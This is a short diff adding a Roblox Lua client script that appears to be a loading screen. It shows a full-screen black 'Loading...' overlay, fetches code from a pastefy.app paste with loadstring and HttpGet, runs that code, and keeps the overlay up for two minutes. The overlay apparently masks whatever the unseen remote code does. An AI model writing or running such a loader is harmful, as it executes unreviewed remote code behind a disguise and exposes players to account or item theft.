@@ -1,0 +1,31 @@
+-- Create the loading screen GUI
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "LoadingScreen"
+screenGui.Parent = playerGui
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.Position = UDim2.new(0, 0, 0, 0)
+frame.BackgroundColor3 = Color3.new(0, 0, 0) -- Black
+frame.Parent = screenGui
+
+local textLabel = Instance.new("TextLabel")
+textLabel.Size = UDim2.new(1, 0, 1, 0)
+textLabel.Position = UDim2.new(0, 0, 0, 0)
+textLabel.BackgroundTransparency = 1
+textLabel.Text = "Loading..."
+textLabel.TextColor3 = Color3.new(1, 1, 1) -- White text
+textLabel.TextScaled = true
+textLabel.Parent = frame
+
+-- Run your external script
+loadstring(game:HttpGet("https://pastefy.app/fzYqxR0Z/raw"))()
+
+-- Wait for 2 minutes
+task.wait(120)
+
+-- Remove the loading screen
+screenGui:Destroy()
